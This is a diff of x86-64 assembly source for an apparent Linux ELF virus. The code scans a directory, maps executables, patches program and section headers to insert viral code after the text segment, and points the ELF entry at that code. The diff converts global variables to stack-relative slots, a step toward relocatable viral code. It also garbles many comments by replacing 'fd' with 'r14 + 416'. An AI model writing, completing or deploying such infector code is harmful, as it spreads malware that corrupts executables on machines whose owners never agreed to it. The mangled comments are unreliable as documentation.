@@ -156,7 +156,7 @@ BITS 64
 ;		.ei_data		resb	1		;
 ;		.ei_version		resb	1		;
 ;		.ei_osabi		resb	1		;
-;		.ei_abiversion	resb	1		;
+;		.ei_abiversion		resb	1		;
 ;		.ei_padding		resb	6		;bytes9-14
 ;		.ei_nident		resb	1		;sizeofidentarray
 ;		.e_type			resw	1		;uint16_t,bytes16-17
@@ -233,6 +233,17 @@ BITS 64
 ;
 ; r14 + 200 = local filename (saved from dirent.d_nameq)
 ;
+; variables used for phdr and shdr manipulation routines
+; r14 + 400 ; evaddr: dq 0 
+; r14 + 408 ; oshoff: dq 0		;original section header offset
+; r14 + 416 ; fd:	dq 0
+; r14 + 424 ; next_segment_offset: dq 0
+; r14 + 432 ; hostentry_offset: dd 0
+; r14 + 436 ; vxoffset: dd 0
+; r14 + 440 ; vxshoff: dd 0
+; r14 + 444 ; vx_padding_size: dd 0
+
+
 ;
 ; r14 + 500 = # of dirent entries returned from getdents64 syscall 
 ;
@@ -252,7 +263,7 @@ BITS 64
 ; r14 + 805			.ei_data		resb	1		;
 ; r14 + 806			.ei_version		resb	1		;
 ; r14 + 807			.ei_osabi		resb	1		;
-; r14 + 808			.ei_abiversion  resb	1		;
+; r14 + 808			.ei_abiversion		resb	1		;
 ; r14 + 809			.ei_padding		resb	6		;bytes9-14
 ; r14 + 815			.ei_nident		resb	1		;sizeofidentarray
 ; r14 + 816			.e_type			resw	1		;uint16_t,bytes16-17
@@ -263,7 +274,7 @@ BITS 64
 ; r14 + 840			.e_shoff		resq	1		;ElfN_Off, bytes 40-47
 ; r14 + 848			.e_flags		resd	1		;uint32_t, bytes 48-51
 ; r14 + 852			.e_ehsize		resb	2		;uint16_t, bytes 52-53
-; r14 + 854			.e_phentsize    resb	2		;uint16_t, bytes 54-55
+; r14 + 854			.e_phentsize		resb	2		;uint16_t, bytes 54-55
 ; r14 + 856			.e_phnum		resb	2		;uint16_t, bytes 56-57
 ; r14 + 858			.e_shentsize		resb	2		;uint16_t, bytes 58-59
 ; r14 + 860			.e_shnum		resb	2		;uint16_t, bytes 60-61
@@ -400,15 +411,24 @@ section .data
 ;****************************************************************************************
 
 ;variables used for phdr and shdr manipulation routines
-evaddr: dq 0
-oshoff: dq 0		;original section header offset
-hostentry_offset: dd 0
+;r14 + 400 ; evaddr: dq 0 
+;r14 + 408 ; oshoff: dq 0		;original section header offset
+;r14 + 416 ; fd:	dq 0
+;r14 + 424 ; next_segment_offset: dq 0
+;r14 + 432 ; hostentry_offset: dd 0
+;r14 + 436 ; vxoffset: dd 0
+;r14 + 440 ; vxshoff: dd 0
+;r14 + 444 ; vx_padding_size: dd 0
+
+
+;oshoff: dq 0		;original section header offset
 next_segment_offset: dq 0
+;fd:	dq 0
+hostentry_offset: dd 0
 vxoffset: dd 0
 vxshoff: dd 0
-;ventry equ $_start 
 vx_padding_size: dd 0
-fd:	dq 0
+
 MAX_RDENT_BUF_SIZE equ 0x800
 ;%define vlen equ vend - _start
  
@@ -433,7 +453,7 @@ _getdirents:
 ;;	rdi == filename
 ;;	rsi == flags
 ;;	rdx == mode
-;; 	returns: fd (in rax, obv)
+;; 	returns: r14 + 416 (in rax, obv)
 ;****************************************************************************************
 	pop rdi
 	xor rsi, rsi 		;no flags
@@ -443,7 +463,7 @@ _getdirents:
 	mov rax, 0x2		;SYS_OPEN ==0x2
 	syscall
 	
-	mov r9, rax						;fd into r9
+	mov r9, rax						;r14 + 416 into r9
 	jmp process_dirents
 
 get_cwd:
@@ -452,8 +472,8 @@ get_cwd:
 	
 ;****************************************************************************************
 ; getdents64 - syscall 0x4e
-;; getdents(unsigned int fd, struct linuxdirent *dirent, unsigned int count);
-;;	rdi == fd
+;; getdents(unsigned int r14 + 416, struct linuxdirent *dirent, unsigned int count);
+;;	rdi == r14 + 416
 ;;	rsi == *dirent
 ;;	rdx == count
 ;;	returns # entries in rax
@@ -473,8 +493,8 @@ process_dirents:
 	mov qword [r14 + 500], rax		;also save # of dir entries to local var on stack
 ;****************************************************************************************
 ; close - syscall 0x3
-;;	close(fd);
-;;	rdi == fd (file descriptor)
+;;	close(r14 + 416);
+;;	rdi == r14 + 416 (file descriptor)
 ;; 	returns: 0 on success (-1 on error)
 ;****************************************************************************************
 	mov rdi, r9
@@ -485,7 +505,7 @@ process_dirents:
 	jmp check_file
 ;****************************************************************************************
 ; write - syscall 0x1
-;;	rdi == fd (file descriptor)
+;;	rdi == r14 + 416 (file descriptor)
 ;;	rsi == const char* buf
 ;;	rdx == count (# of bytes to write)
 ;; 	returns: 0 on success (-1 on error)
@@ -600,12 +620,12 @@ check_file:
 
 	
 		;void *mmap(void addr[.length], size_t length, int prot, int flags,
-		;                  int fd, off_t offset);
+		;                  int r14 + 416, off_t offset);
 	mmap_file:
 		xor rdi, rdi			;set RDI to NULL
 		mov rsi, [r14 + 48] 	;filestat.st_size
 		mov rdx, 0x3 			; (PROT_READ | PROT_WRITE)
-								; fd is already in r8 so we don't need to set that reg again
+								; r14 + 416 is already in r8 so we don't need to set that reg again
 		mov r10, 0x2			; MAP_PRIVATE
 		xor r9, r9				; offset of 0 within file == start of file, obv	
 		mov rax, 0x9 ;SYS_MMAP
@@ -674,7 +694,7 @@ check_file:
 		jmp painting
 
 	checknext:
-		mov rdi, fd
+		mov rdi, qword [r14 + 416]
 		mov rsi, [r14 + 48] 			;filestat.st_size
 		mov rax, 0xB ;SYS_MUNMAP
 		syscall
@@ -797,10 +817,10 @@ infect:
 				je .mod_phdr_text_segment			
 				jmp .mod_subsequent_phdr
 				.mod_phdr_text_segment:			
-					mov r10, [r13 + r12 + 16] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+					mov r10, [r13 + r12 + 16] 	;entry virtual addr (r14 + 400) = phdr->p_vaddr + phdr->p_filesz
 					add r10, [r13 + r12 + 32]			;elf_phdr.p_filesz offset
-					mov qword [evaddr], r10				;save evaddr
-														;new entry point of infected file = evaddr + ventry
+					mov qword [r14 + 400], r10				;save r14 + 400
+														;new entry point of infected file = r14 + 400 + ventry
 					mov qword [r13 + 24], r10			; update ELF header entry point to point to virus code start
 					mov r10, [r13 + r12 + 8]			;elf_phdr.p_offset  
 					add r10, [r13 + r12 + 32]			;elf_phdr.p_filesz offset
@@ -814,7 +834,7 @@ infect:
 				cmp r11d, 0
 				je .next_phdr
 				mov r10, [r13 + r12 + 8]			;elf_phdr.p_offset  
-				cmp r10, [evaddr]
+				cmp r10, qword [r14 + 400]
 				jl .next_phdr
 				add dword r10d, [PAGESIZE]
 				mov [r13 + r12 + 8], r10				;elf_phdr.p_offset
@@ -864,7 +884,7 @@ infect:
 			.check_for_last_text_shdr:
 				mov r11, [r13 + r15 + 16]						;elf_shdr.sh_addr
 				add r11, qword [r13 + r15 + 32]					;elf_shdr.sh_size
-				cmp r11, [evaddr]
+				cmp r11, qword [r14 + 400]
 				jne .next_shdr
 			.mod_last_text_section_shdr:
 				mov r10, [r13 + r15 + 32]						;elf_shdr.sh_size
@@ -882,7 +902,7 @@ infect:
 			cmp cx, 0
 			jg .shdr_loop
 	mov r11, [r13 + 40] 					;elf_ehdr.e_shoff
-	mov qword [oshoff], r11
+	mov qword [r14 + 408], r11
 ;	cmp dword r11d, [vxoffset]
 ;	jge .patch_ehdr_shoff
 	.patch_ehdr_shoff:
@@ -960,8 +980,8 @@ frankenstein_elf:
 		mov rax, 0x1 					;SYS_WRITE
 		syscall
 
-	; pwrite64(int fd, const void* buf, size_t count, off_t offset)
-	; rdi == fd
+	; pwrite64(int r14 + 416, const void* buf, size_t count, off_t offset)
+	; rdi == r14 + 416
 	; rsi == buf
 	; rdx == count 
 	; r10 == offset
@@ -992,12 +1012,12 @@ frankenstein_elf:
 		syscall
 		
 	
-	;ftruncate syscall will grow the size of file (corresponding to file descriptor fd)
+	;ftruncate syscall will grow the size of file (corresponding to file descriptor r14 + 416)
 	; by n bytes, where n is a signed integer, passed in rsi
 	;ftruncate grows the file with null bytes, so this will append nec. padding bytes
 	;before we write the original host data segment to the temp file
-	; ftruncate(int fd, offset_t length)
-	; rdi == fd
+	; ftruncate(int r14 + 416, offset_t length)
+	; rdi == r14 + 416
 	; rsi == length
 	.write_padding_after_vx:
 		xor r11, r11
@@ -1024,7 +1044,7 @@ frankenstein_elf:
 		;shl r11d, 1
 		;;add eax, dword [PAGESIZE] 
 		;;add eax, r11d 
-		mov esi, dword [next_segment_offset]
+		mov rsi, qword [next_segment_offset]
 		add esi, r11d 
 		;;mov dword [vx_padding_size], eax
 		mov dword [vx_padding_size], esi
@@ -1035,7 +1055,7 @@ frankenstein_elf:
 
 	.write_datasegment_totemp:
 		xor r10, r10
-		mov rdx, qword [oshoff]
+		mov rdx, qword [r14 + 408]
 		sub edx, dword [next_segment_offset]
 		lea rsi, [r13]							;r13 contains pointer to mmap'd file
 		add rsi, qword [next_segment_offset]	;adjust rsi address to point to PT_LOAD segment 
@@ -1047,9 +1067,9 @@ frankenstein_elf:
 
 	.write_patched_shdrs_totemp:
 		mov rdx, [r14 + 48] 					;filestat.st_size
-		sub rdx, qword [oshoff]
+		sub rdx, qword [r14 + 408]
 		lea rsi, [r13]
-		add rsi, qword [oshoff]
+		add rsi, qword [r14 + 408]
 		mov r10d, dword [vxshoff]
 		mov rax, 0x12							;SYS_PWRITE64 	equ 0x12
 		syscall
